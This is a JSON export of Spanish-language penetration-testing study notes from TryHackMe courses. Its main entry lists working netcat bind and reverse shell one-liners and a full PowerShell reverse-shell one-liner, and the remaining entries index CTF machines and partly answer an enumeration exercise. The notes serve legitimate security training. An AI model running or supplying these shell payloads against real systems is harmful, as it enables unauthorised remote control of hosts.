[
  {
    "title": "8. Common Shell Payloads",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/8-common-shell-payloads/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/8. Common Shell Payloads.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Dentro de poco veremos cómo generar payloads con msfvenom, pero antes de eso echemos un vistazo a algunos payloads comunes usando las herramientas que hemos visto.\n\n----------------------------------------\nEn algunas versiones de netcat, hay una opción `-e` que permite ejecutar un proceso en conexión, por ejemplo:\n\n`nc -lvnp <puerto> -e /bin/bash`\n\nConectarse al listener de arriba tendría como resultado una bind shell en el objetivo.\n\nIgualmente, conectarse de vuelta a `nc <ip_local> <puerto> -e /bin/bash` resultaría en una reverse shell en el objetivo.\n\n En Windows, donde se requiere un binario estático, esta técnica funcionaría perfectamente. Sin embargo, en Linux usaríamos el siguiente código para crear un listener para una bind shell:\n \n`mkfifo /tmp/f; nc -lvnp <puerto> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`\n\nEste comando:\n\n1. Primero crea una \"named pipe\", que es un método de comunicación bidireccional entre procesos, en `/tmp/f`.\n2. Luego crea un listener netcat y conecta el input del listener al output de la named pipe.\n3. El output del listener se pipea (redirige) hacia `sh`, mandando el output estándar de errores (stderr) a stdout.\n4. Manda stdout por el input de la named pipe, completando el círculo.\n\n![[Pasted image 20251124230612.png]]\n\nUn comando muy similar puede ser usado para mandar una reverse shell de netcat:\n\n`mkfifo /tmp/f; nc <ip_local> <puerto> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`\n\nEste comando es virtualmente idéntico al de arriba (menos por usar la sintaxis de listen de netcat).\n\n![[Pasted image 20251124230849.png]]\n\n----------------------------------\nAl atacar Server de Windows moderno, es muy común necesitar una reverse shell de Powershell, así que lo cubriremos ahora (PSH reverse shell en una línea).\n\nEste comando es muy complejo por lo que no veremos aquí su funcionamiento. Sin embargo, es útil tenerlo a mano.\n\n`powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"`\n\nPara usarlo debemos reemplazar `<IP>` y `<port>`. Después lo copiamos a una cmd.exe u otras formas de ejecutar comandos en un Windows Server, como webshell. Por último lo ejecutamos.\n\n![[Pasted image 20251124231408.png]]\n\n---------------------------------------\nPara más payloads de reverse shell, puedes visitar [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). Es un repositorio que contiene muchas en varios lenguajes.",
    "modified": "2025-11-25T00:48:58"
  },
  {
    "title": "2. Medium",
    "path": "/apuntes/ciberseguridad/thm/maquinas/2-medium/2-medium/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/Maquinas/2. Medium/2. Medium.md",
    "breadcrumb": "Ciberseguridad > THM > Maquinas > 2. Medium",
    "content": "1. [[0. Mr. Robot CTF]]\n2. [[Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/0. Net Sec Challenge]]\n3. [[0. Revenge]]\n4. [[0. Rabbit Store]]\n5. [[0. Ultra Tech]]\n6.",
    "modified": "2025-11-24T20:06:19"
  },
  {
    "title": "1. Easy",
    "path": "/apuntes/ciberseguridad/thm/maquinas/1-easy/1-easy/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/Maquinas/1. Easy/1. Easy.md",
    "breadcrumb": "Ciberseguridad > THM > Maquinas > 1. Easy",
    "content": "1. [[Ciberseguridad/THM/Maquinas/1. Easy/1. Vulnerability Capstone/0. Vulnerability Capstone]]\n2. [[Ciberseguridad/THM/Maquinas/1. Easy/2. Pickle Rick/0. Pickle Rick]]\n3. [[0. Lookup]]\n4. [[0. Res]]\n5. [[0. Brooklyn Nine Nine]]\n6.",
    "modified": "2025-11-24T20:06:19"
  },
  {
    "title": "0. Ultra Tech",
    "path": "/apuntes/ciberseguridad/thm/maquinas/2-medium/5-ultra-tech/0-ultra-tech/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/Maquinas/2. Medium/5. Ultra Tech/0. Ultra Tech.md",
    "breadcrumb": "Ciberseguridad > THM > Maquinas > 2. Medium > 5. Ultra Tech",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/5. Ultra Tech/1. Introduction]]\n[[2. Enumeration Time]]\n[[3. Let the Fun Begin]]\n[[4. The Root of All Evil]]",
    "modified": "2025-11-24T20:06:19"
  },
  {
    "title": "2. Enumeration Time",
    "path": "/apuntes/ciberseguridad/thm/maquinas/2-medium/5-ultra-tech/2-enumeration-time/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/Maquinas/2. Medium/5. Ultra Tech/2. Enumeration Time.md",
    "breadcrumb": "Ciberseguridad > THM > Maquinas > 2. Medium > 5. Ultra Tech",
    "content": "1. ¿Qué software está usando el puerto 8081?\n   ![[Pasted image 20251124195639.png]]\n2. ¿Qué otro puerto no estándar está siendo usado?\n   ![[Pasted image 20251124195529.png]]\n3. ¿Qué software usa ese puerto?\n   ![[Pasted image 20251124195842.png]]\n4. ¿Qué distro de GNU/Linux está usándose?\n   Ubuntu. Lo dice en el servicio del puerto 31331.\n5. El software usando el puerto 8081 es una api REST, ¿cuántas de sus rutas son usadas por la aplicación web?\n   ![[Pasted image 20251124200053.png]]\n   Son 2, las que se ven ahí.",
    "modified": "2025-11-24T20:06:19"
  }
]